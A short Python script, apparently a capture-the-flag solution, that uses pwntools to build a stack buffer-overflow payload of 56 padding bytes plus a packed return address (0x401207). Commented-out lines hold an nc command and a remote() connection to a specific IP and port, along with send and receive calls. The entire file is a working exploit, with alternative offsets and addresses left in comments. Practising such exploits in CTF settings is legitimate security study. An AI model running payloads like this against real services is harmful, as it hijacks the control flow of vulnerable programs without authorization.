from pwn import *
# s='a'*48+p64(0x0000000000401213)
s='a'*56
# s=p64(0x7ffff7f6f5aa)*7
# nc 50.19.216.79 1237

p=p64(0x0000000000401207)
s=s+p
print(s)
# r=remote('50.19.216.79',1237)
# print(s)
# print(r.recv())
# r.sendline(s)
# print(r.recv())
# print(r.recv())